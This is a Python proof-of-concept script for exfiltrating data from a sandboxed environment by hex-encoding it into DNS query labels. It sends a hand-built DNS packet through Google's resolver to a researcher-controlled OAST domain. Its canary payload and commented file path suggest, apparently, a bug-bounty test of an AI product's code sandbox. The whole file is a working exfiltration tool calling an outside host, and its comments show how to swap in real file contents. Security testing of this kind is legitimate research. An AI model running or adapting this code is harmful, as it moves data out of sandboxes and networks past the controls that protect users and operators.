#!/usr/bin/env python3
"""
PoC: DNS OAST exfiltration from a sandboxed Python environment.

This script demonstrates how data can be encoded into DNS labels
and exfiltrated via outbound DNS queries to an attacker-controlled domain.

WARNING: Use only in authorized testing environments.
Do not use to exfiltrate real sensitive data.
"""

import socket
import struct
import random

# =========================
# CONFIGURATION (RESEARCHER-CONTROLLED)
# =========================

# Simulated "sandbox file content" (in a real test, this would be read from disk)
# Example:
#   with open("/home/workdir/attachments/XAI_H1_REPLICA2.txt", "rb") as f:
#       data = f.read().strip()
DATA = b"XAI_H1_REPLICA2_CANARY_20260810_1014_6F2C9A"

# OAST domain controlled by the researcher
OAST_BASE = "dnbrkdjfxdiywdejztfatv6x4lncppsqg.oast.fun"

# DNS resolver (public Google DNS)
DNS_SERVER = "8.8.8.8"
DNS_PORT = 53

# =========================
# DNS PACKET BUILDING
# =========================

def qname(name: str) -> bytes:
    """Encode a DNS QNAME (domain name) as per RFC 1035."""
    out = b""
    for label in name.split("."):
        b = label.encode("ascii")
        if len(b) > 63:
            raise ValueError(f"Label too long: {label!r}")
        out += bytes([len(b)]) + b
    return out + b"\x00"


def build_dns_query(qname_bytes: bytes, tid: int) -> bytes:
    """Build a minimal DNS A query packet."""
    # Header: ID, Flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
    header = struct.pack(
        "!HHHHHH",
        tid,        # ID
        0x0100,     # Flags: standard query
        1,          # QDCOUNT
        0,          # ANCOUNT
        0,          # NSCOUNT
        0,          # ARCOUNT
    )
    # Question: QNAME, QTYPE (A = 1), QCLASS (IN = 1)
    question = qname_bytes + struct.pack("!HH", 1, 1)
    return header + question


# =========================
# MAIN
# =========================

def main():
    # Encode data as hex
    encoded = DATA.hex()

    # Split into chunks <= 50 bytes to stay well under DNS label limit (63)
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]

    # Build FQDN: <chunk1>.<chunk2>.<...>.<OAST_BASE>
    fqdn = ".".join(chunks + [OAST_BASE])
    print(f"DATA={DATA.decode('ascii', errors='replace')}")
    print(f"ENCODED={encoded}")
    print(f"OAST_FQDN={fqdn}")

    # Build DNS query
    qname_bytes = qname(fqdn)
    tid = random.randrange(65536)
    packet = build_dns_query(qname_bytes, tid)

    # Send query over TCP (some environments block UDP DNS)
    print(f"Sending DNS query to {DNS_SERVER}:{DNS_PORT} ...")
    s = socket.create_connection((DNS_SERVER, DNS_PORT), timeout=5)
    s.sendall(struct.pack("!H", len(packet)) + packet)

    # Read response
    hdr = s.recv(2)
    if len(hdr) < 2:
        print("No response received.")
        s.close()
        return

    length = struct.unpack("!H", hdr)[0]
    reply = b""
    while len(reply) < length:
        part = s.recv(length - len(reply))
        if not part:
            break
        reply += part

    s.close()

    if len(reply) < 12:
        print("Invalid DNS response.")
        return

    rid, flags = struct.unpack("!HH", reply[:4])
    rcode = flags & 0x0F

    print(f"DNS_RESPONSE=YES")
    print(f"TXID_MATCH={'YES' if rid == tid else 'NO'}")
    print(f"RCODE={rcode}")

    if rcode == 0:
        print("DNS query successful (NOERROR).")
    else:
        print(f"DNS query returned error code: {rcode}")


if __name__ == "__main__":
    main()
